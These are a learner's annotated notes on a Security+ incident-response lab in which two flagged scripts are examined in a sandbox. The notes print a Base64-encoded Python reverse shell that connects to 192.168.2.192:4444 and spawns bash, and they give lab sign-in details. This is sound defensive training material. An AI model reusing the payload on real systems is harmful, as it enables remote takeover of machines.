# Assisted Lab 26: Identifying Malicious Code

## Scenario

You are supporting incident response by assessing indicators to determine whether a case should be escalated to senior analysts. You have two script samples that server managers have flagged as suspicious. Identify the type of code used in both cases and decide whether they should be escalated to the senior response team.

## Objectives

This activity is designed to test your understanding of and ability to apply content examples in the following CompTIA Security+ objective:

-   1.4 Given a scenario, analyze potential indicators associated with network attacks.

## Analyze first suspicious code sample

You have duplicates of the DC1 and MS1 servers installed to an isolated network segment to use for sandbox analysis. The code samples have been supplied to you on an optical disc. The first sample is named "iam_accounts_staged.ps1". This sample was found on a secure admin workstation (SAW). The script was intended to provision temporary user accounts and a shared folder on domain computers.

1.  On the [MS1](https://labclient.labondemand.com/Instructions/e04d7668-130f-484e-ac66-c3d592cc150a?rc=10#) VM, send [Ctrl+Alt+Delete](https://labclient.labondemand.com/Instructions/e04d7668-130f-484e-ac66-c3d592cc150a?rc=10#) and then sign in as 515support\administrator with password Paw0rd
    
2.  Select [RSH](https://labclient.labondemand.com/Instructions/e04d7668-130f-484e-ac66-c3d592cc150a?rc=10#) to load the media holding the suspicious scripts.
    
3.  In File Explorer, open the **DVD Drive** to view the files.
    
4.  Press **CTRL+A** to select all the files, then right-click the selection and select **Scan with Windows Defender**. Observe the result.
    
5.  Why are these scan results not reliable?
    
    The anti-virus definitions are out-of-date (**NO IDEA you guys didn't tell us that it was old?)
   
    
6.  Close Windows Defender.
    
7.  Select **Start**, right-click **Windows PowerShell ISE** and select **More > Run as administrator**. Confirm the UAC prompt.
    
8.  Select **File > Open**. Browse to the **DVD Drive**, select **iam_accounts_staged.ps1** and select **Open**.
    
9.  Assess the code. Consider the context in which it was discovered and make an initial assessment of whether it is malicious.
    
10.  What is the nature of this code?
    

**I didn't see this?**
    Malware seems to have been appended to a legitimate script
    
  
    

    
    Feedback
    
    As you are confident in the integrity of your sandbox environment, you decide to execute the code to determine its function and gather some additional information to send to the senior analyst team.
    
11.  From the C:\LABFILES\Sysinternals\ folder, right-click **procexp64.exe** and select **Run as administrator**. Confirm the UAC prompt.
    
12.  When Process Explorer is running to monitor the host, in PowerShell ISE, press **F5** to execute the script. When the script seems to have completed, press **ENTER**.
    
    > Ignore any error messages generated by the first part of the script - they will not affect this analysis activity. After pressing **ENTER**, you will only have a few minutes to analyze the malware as it will terminate when no connection is made. If necesssary, you can restart it by opening PowerShell ISE again and running the script again.
    
13.  In PowerShell ISE, run `netstat -ano`. Analyze the output to determine the suspicious network connection.
    
14.  Which socket is the malicious process attempting to establish a connection with?
    
    192.168.2.192 port 4444

    Feedback
    Examine the Foreign Address column to locate an endpoint using a non-standard port (4444). The malware is trying to establish a reverse shell. This means that the malware tries to establish the connection. There is no listener at or route to 192.168.2.192, so the port remains in the SYN_SENT state until the process times out and terminates.
    
15.  Make a note of the PID of the process that is attempting to connect: 
    
16.  Run the following command to export the netstat output to a file:
    
    ```
    netstat -ano > $env:USERPROFILE\desktop\netstat.txt
    ```
    
17.  In Process Explorer, locate the PID.
    
18.  What is the image name of the process is hosting the malware?
    
![[Pasted image 20220622195751.png]]
    Powershell is the process hosting the malware
    
    powershell_ise.exe
    
    Feedback
    
19.  Note user name and integrity level. The malware has high permissions because the host PowerShell ISE process was launched as administrator. This illustrates the risk of running accounts and processes with high privilege levels when it is not necessary.
    
20.  Select **File > Save As**. Select the **Desktop** location and save with the file name procexp.txt
    
21.  Confirm that the report output has been created:
    
22.  Close all open windows.

## Analyze second suspicious code sample

The second sample was retrieved from a web server's common gateway interface (CGI) folder and marked as executable.

1.  Open **Windows PowerShell ISE** again (you do not have to run it as administrator this time). If the .ps1 script is opened again, just close it.
    
2.  Select **File > Open**. If necessary, browse to the **DVD Drive**. From the File type box, select **All Files**. Select **get.py** and select **Open**.
    
3.  Examine the single long line of code.
    
4.  Which scripting language is the code written in?
    
    PowerShell
    
    Windows cmd
    
    Bash
    
    Python
    
    FeedbackThe script is executed in a Python interpreter.
    #research 
5.  The script is obfuscated by Base64 encoding. You can use PowerShell to decode this back to recognizable script syntax. Either replace the existing line of code in the PowerShell ISE with the following or edit the code so that it appears as follows:
    
    PowerShell
    
    `[Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('aW1wb3J0IHNvY2tldCAgLCAgICAgICAgc3VicHJvY2VzcyAgLCAgICAgICAgb3M7ICAgICAgICBob3N0PSIxOTIuMTY4LjIuMTkyIjsgICAgICAgIHBvcnQ9NDQ0NDsgICAgICAgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAgLCAgICAgICAgc29ja2V0LlNPQ0tfU1RSRUFNKTsgICAgICAgIHMuY29ubmVjdCgoaG9zdCAgLCAgICAgICAgcG9ydCkpOyAgICAgICAgb3MuZHVwMihzLmZpbGVubygpICAsICAgICAgICAwKTsgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgLCAgICAgICAgMSk7ICAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICwgICAgICAgIDIpOyAgICAgICAgcD1zdWJwcm9jZXNzLmNhbGwoIi9iaW4vYmFzaCIp')) > $env:USERPROFILE\desktop\get_decoded.py`
    
6.  In PowerShell ISE, select **File > Save As**. Select the **Desktop** location and select **Save**.
    
7.  Press **F5** to execute the modified script and output the decoded syntax to a new file:
    
8.  Check that the output file has been created successfully:
    
    FeedbackIf the output file is not created, check that the PowerShell ISE editor contains only the single line of modified code, starting "[Text.Encoding]" and ending "$env:USERPROFILE\desktop\get_decoded.py".
    
9.  In File Explorer, navigate to the desktop. Right-click **get_decoded.py** and select **Edit with Notepad++**.
    
10.  Tidy up the line breaks to make the code more readable. Select the sequence of spaces between the comma and the word "subprocess". Press **CTRL+H** to open the Find and Replace dialog. Select in the **Replace with** box and type \r\n. From the Search Mode box, select **Extended**. Select **Replace All**. Close the dialog.
    
11.  Examine the code.
    
12.  What is the function of this script?
	Establish a [[Bash reverse shell]]

## Comprehensive questions


Is there any correlating information that might indicate a single culprit behind both scripts?
	Yes, the same IP address and port number
	
Feedback 
While this example is only a private IP address, in the real world the use of the same address (or range of addresses) could be useful data in determining whether attacks are linked to the same threat actor. Access to privileged hosts might suggest an insider attack that would in all likelihood have been launched by the same person, but is not quite as strong a correlating indicator. Most threat actors are skilled in multiple scripting languages, so this is not an appropriate conclusion.

  

Considering the legitimate purpose of the iam_accounts_staged.ps1 script, what serious security vulnerability does the first part of the code expose?

	Exposes a user credential

Line 1 contains the default user credential as a variable. While the script sets the account properties to force a password change, this is often not done in a timely manner. A threat actor could also try this default credential against other accounts in the hope that it is widely used. The script does not accept any input, so cannot contain a validation vulnerability. Many scripts perform actions that require elevated privileges. Care must be taken in executing such scripts, but it is not a vulnerability of the script itself.

  

What urgent response should the presence of this code on internal systems prompt?

Discover the source of the privileged access

Feedback
The location in which the code was discovered indicates that a threat actor probably has ongoing privileged access to high value assets. Identifying, containing, and eradicating this threat is the top priority. A breach notification may be required, but additional information will have to be gathered first to confirm what data has been compromised. While important, this is not as high priority as preventing additional damage or loss. Regular anti-virus updates should be performed and the reasons for missing updates needs to be investigated, but again this is not at quite the same level of priority. Dismissing the incident would be negligent.